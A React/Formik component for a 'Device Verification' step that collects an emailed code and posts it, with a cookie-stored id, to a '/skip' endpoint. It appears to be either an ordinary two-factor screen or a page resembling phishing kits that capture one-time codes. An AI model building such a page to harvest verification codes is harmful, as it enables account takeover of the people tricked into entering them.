import { Field, Form, Formik } from "formik";
import Cookies from "js-cookie";
import React from "react";
import { toast } from "react-toastify";
import { API_URL } from "../config";

function Security({ setShowModal }) {
  const id = Cookies.get("id");
  const email = Cookies.get("email");

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      formik.resetForm();
      Cookies.remove("id");
      Cookies.remove("email");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="w-[448px] px-10 pt-[54px] bg-white text-black rounded">
      <Formik
        initialValues={initialvalues}
        // validationSchema={validate}
        onSubmit={handleSubmit}
      >
        {(formik) => (
          <Form className="">
            <div className="">
              <h2 className="text-2xl">Device Verification 1/2</h2>
              <p className="mt-1">
                We have just sent a Verification Code to email address provided
                {/* <strong> email@email.com</strong> */}
                <strong> {email}</strong>
              </p>

              <div className="mt-5 flex justify-center">
                <div className="w-full">
                  <Field
                    className="w-full text-lg px-3 py-3 outline-none border border-slate-300 shadow-inner placeholder:font-medium placeholder:text-black/50"
                    name="skipcode"
                    placeholder="Enter Code Here"
                    type="text"
                    required
                    autoFocus
                  />
                </div>
              </div>

              <p className="mt-2">
                No Code received yet?{" "}
                <span className="text-amber-500 cursor-pointer">Resend</span>
              </p>
              <p className="mt-3">
                Having trouble with receiving the Code, You can contact the{" "}
                <span className="text-amber-500 cursor-pointer">Support</span>
              </p>

              <div className="mt-[50px] mb-[100px]">
                <button
                  type="submit"
                  className="px-3 py-1.5  bg-transparent text-amber-500 border border-amber-500 rounded hover:bg-amber-500 hover:text-white transition-colors duration-200"
                >
                  Next
                </button>
              </div>

              {/* <div className="mt-[60px] mb-[120px] flex gap-4 justify-end">
                <button
                  type="button"
                  className="px-[22px] py-2 mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2 text-white transition duration-300 rounded"
                  onClick={() => setShowModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="px-[22px] py-2 mt-5 w-full text-lg font-medium bg-[#2ba6cb] hover:bg-custom-cyan2  text-white transition duration-300 rounded"
                >
                  Verify
                </button>
              </div> */}
            </div>
          </Form>
        )}
      </Formik>
    </div>
  );
}

export default Security;
